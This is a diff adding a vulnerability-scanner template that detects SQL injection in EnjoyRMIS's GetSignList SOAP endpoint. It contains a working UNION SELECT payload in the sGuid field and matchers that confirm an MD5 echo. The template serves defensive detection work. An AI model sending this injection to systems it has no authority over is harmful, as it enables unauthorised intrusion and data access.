@@ -1,0 +1,42 @@
+id: enjoyrmis-getsignlist-sqli
+info:
+  name: EnjoyRMIS GetSignList SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+http:
+  - raw:
+      - |
+        POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetSignList"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetSignList xmlns="http://tempuri.org/">
+              <sGuid>1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')),NULL,NULL,NULL--</sGuid>
+              <sType>string</sType>
+              <sSourceId>string</sSourceId>
+            </GetSignList>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "GetSignListResponse"
+          - "GetSignListResult"
+        condition: and
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
